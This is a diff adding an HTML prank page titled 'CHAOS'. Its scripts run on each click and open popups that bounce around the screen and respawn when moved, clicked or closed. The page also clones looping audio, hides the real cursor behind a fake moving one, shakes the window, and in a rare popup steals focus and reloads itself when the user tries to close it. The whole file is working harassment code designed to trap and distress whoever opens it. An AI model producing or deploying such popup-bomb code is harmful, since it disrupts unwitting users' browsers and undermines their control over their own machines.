@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CHAOS (456 + Rare Shake + Mouse Hijack + Mega Event)</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: black;
+      user-select: none;
+      pointer-events: none;
+      cursor: none;
+    }
+    video {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      z-index: -1;
+    }
+    #fakeCursor {
+      position: fixed;
+      width: 20px;
+      height: 20px;
+      background: white;
+      border-radius: 50%;
+      box-shadow: 0 0 10px white;
+      pointer-events: none;
+      z-index: 99999;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <video autoplay loop muted>
+    <source src="video.mp4" type="video/mp4" />
+  </video>
+
+  <div id="fakeCursor"></div>
+
+  <audio id="prankAudio" autoplay loop muted>
+    <source src="audio.mp3" type="audio/mpeg" />
+  </audio>
+
+  <script>
+    let firstClickDone = false;
+    let hijackActive = false;
+    let megaEventTriggered = false;
+    const fakeCursor = document.getElementById(\'fakeCursor\');
+
+    function screenShake() {
+      const intensity = 20;
+      let count = 0;
+      const maxCount = 20;
+      const interval = setInterval(() => {
+        const offsetX = (Math.random() - 0.5) * intensity;
+        const offsetY = (Math.random() - 0.5) * intensity;
+        try { window.moveBy(offsetX, offsetY); } catch (e) {}
+        count++;
+        if (count > maxCount) clearInterval(interval);
+      }, 30);
+    }
+
+    function hijackMouse() {
+      hijackActive = true;
+      fakeCursor.style.display = "block";
+      let x = window.innerWidth / 2;
+      let y = window.innerHeight / 2;
+      const speed = 10;
+
+      function moveFakeCursor() {
+        if (!hijackActive) return;
+        x += (Math.random() - 0.5) * speed * 4;
+        y += (Math.random() - 0.5) * speed * 4;
+
+        x = Math.max(0, Math.min(window.innerWidth - 20, x));
+        y = Math.max(0, Math.min(window.innerHeight - 20, y));
+
+        fakeCursor.style.left = x + "px";
+        fakeCursor.style.top = y + "px";
+
+        requestAnimationFrame(moveFakeCursor);
+      }
+      moveFakeCursor();
+
+      setTimeout(() => {
+        hijackActive = false;
+        fakeCursor.style.display = "none";
+      }, 8000);
+    }
+
+    function createMegaEventPopup() {
+      const popup = window.open(\'\', \'\', \'width=800,height=800,left=100,top=100\');
+      if (!popup) return;
+
+      popup.document.write(`\n        <!DOCTYPE html>\n        <html lang="en">\n        <head>\n          <meta charset="UTF-8" />\n          <title>MEGA CHAOS</title>\n          <style>\n            html, body {\n              width: 100%;\n              height: 100%;\n              margin: 0;\n              background: black;\n              display: flex;\n              justify-content: center;\n              align-items: center;\n              overflow: hidden;\n              cursor: none;\n            }\n            img {\n              max-width: 100%;\n              max-height: 100%;\n              animation: spin 2s infinite linear;\n            }\n            @keyframes spin {\n              from { transform: rotate(0deg); }\n              to { transform: rotate(360deg); }\n            }\n            #fakeMouse {\n              position: fixed;\n              width: 24px;\n              height: 24px;\n              background: white;\n              border-radius: 50%;\n              box-shadow: 0 0 15px red;\n              pointer-events: none;\n              z-index: 10000;\n            }\n            audio { display: none; }\n          </style>\n        </head>\n        <body>\n          <img src="HAHAHAHAHAHA.jpg" />\n          <audio autoplay loop>\n            <source src="Cat Laughing At You.mp3" type="audio/mpeg" />\n          </audio>\n          <div id="fakeMouse"></div>\n          <script>\n            const fakeMouse = document.getElementById(\'fakeMouse\');\n            let x = window.innerWidth / 2;\n            let y = window.innerHeight / 2;\n\n            function moveCrazyMouse() {\n              x += (Math.random() - 0.5) * 50;\n              y += (Math.random() - 0.5) * 50;\n              x = Math.max(0, Math.min(window.innerWidth - 20, x));\n              y = Math.max(0, Math.min(window.innerHeight - 20, y));\n              fakeMouse.style.left = x + "px";\n              fakeMouse.style.top = y + "px";\n              requestAnimationFrame(moveCrazyMouse);\n            }\n            moveCrazyMouse();\n\n            setInterval(() => { try { window.focus(); } catch (e) {} }, 500);\n\n            window.onbeforeunload = () => {\n              setTimeout(() => { window.location.reload(); }, 10);\n              return "This cannot be closed.";\n            };\n\n            // Block manual mouse movement completely\n            window.addEventListener("mousemove", e => {\n              e.preventDefault();\n            }, { passive: false });\n          <\/script>\n        </body>\n        </html>\n      `);
+    }
+
+    function createBouncingPopup(multiplier = 2) {
+      const w = 300;
+      const h = 300;
+      const left = Math.floor(Math.random() * (screen.availWidth - w));
+      const top = Math.floor(Math.random() * (screen.availHeight - h));
+
+      const popup = window.open(\'\', \'\', `width=${w},height=${h},left=${left},top=${top}`);
+      if (!popup) return;
+
+      popup.document.write(`\n        <!DOCTYPE html>\n        <html lang="en">\n        <head>\n          <meta charset="UTF-8" />\n          <title>Popup</title>\n          <style>\n            html, body {\n              width: 100%;\n              height: 100%;\n              margin: 0;\n              overflow: hidden;\n              background: black;\n              display: flex;\n              justify-content: center;\n              align-items: center;\n              color: white;\n              font-family: Arial, sans-serif;\n              font-size: 24px;\n              text-align: center;\n              user-select: none;\n            }\n            video {\n              position: fixed;\n              top: 0;\n              left: 0;\n              width: 100%;\n              height: 100%;\n              object-fit: cover;\n              z-index: -1;\n            }\n          </style>\n        </head>\n        <body>\n          <video autoplay loop muted>\n            <source src="video.mp4" type="video/mp4" />\n          </video>\n     <audio autoplay loop id=\"popupAudio\">\n            <source src=\"audio.mp3\" type=\"audio/mpeg\" />\n          </audio>\n          <div>CHAOS!</div>\n          <script>\n            let x = Math.floor(Math.random() * screen.availWidth);\n            let y = Math.floor(Math.random() * screen.availHeight);\n            let dx = 8 + Math.random() * 10;\n            let dy = 8 + Math.random() * 10;\n\n            function bounce() {\n              try {\n                x += dx;\n                y += dy;\n                if (x <= 0 || x + window.outerWidth >= screen.availWidth) dx = -dx;\n                if (y <= 0 || y + window.outerHeight >= screen.availHeight) dy = -dy;\n                window.moveTo(x, y);\n                setTimeout(bounce, 15);\n              } catch (e) {}\n            }\n            bounce();\n\n            let lastX = window.screenX;\n            let lastY = window.screenY;\n            setInterval(() => {\n              if (window.screenX !== lastX || window.screenY !== lastY) {\n                try { window.opener.createBouncingPopup(multiplier); } catch (e) {}\n              }\n              lastX = window.screenX;\n              lastY = window.screenY;\n            }, 200);\n\n            window.addEventListener(\'click\', () => {\n              const audioClone = document.getElementById(\'popupAudio\').cloneNode(true);\n              audioClone.currentTime = 0;\n              audioClone.play();\n              document.body.appendChild(audioClone);\n              try { window.opener.createBouncingPopup(multiplier); } catch (e) {}\n            });\n\n            setInterval(() => {\n              dx *= 2;\n              dy *= 2;\n            }, 6000);\n\n            window.onbeforeunload = () => {\n              try { window.opener.createBouncingPopup(multiplier); } catch (e) {}\n            };\n          <\/script>\n        </body>\n        </html>\n      `);
+    }
+    window.addEventListener(\'click\', () => {
+      const baseAudio = document.getElementById(\'prankAudio\');
+      const video = document.querySelector(\'video\');
+      
+      // Unmute and play audio on first click
+      if (baseAudio.muted) {
+        baseAudio.muted = false;
+        baseAudio.play();
+      }
+      
+      // Unmute video on first click
+      if (video.muted) {
+        video.muted = false;
+      }
+      
+      const clone = baseAudio.cloneNode(true);
+      clone.currentTime = 0;
+      clone.play();
+      document.body.appendChild(clone);
+
+      if (!firstClickDone) {
+        firstClickDone = true;
+        if (Math.random() < 1 / (100 + Math.random() * 900)) {
+          screenShake();
+        }
+      }
+
+      if (Math.random() < 1 / (200 + Math.random() * 1800)) {
+        hijackMouse();
+      }
+
+      if (!megaEventTriggered && Math.random() < 1 / 1000000) {
+        megaEventTriggered = true;
+        createMegaEventPopup();
+      }
+
+      createBouncingPopup(2);
+    });
+
+    window.onbeforeunload = () => {
+      createBouncingPopup(2);
+    };
+  </script>
+</body>
+</html>
+
+
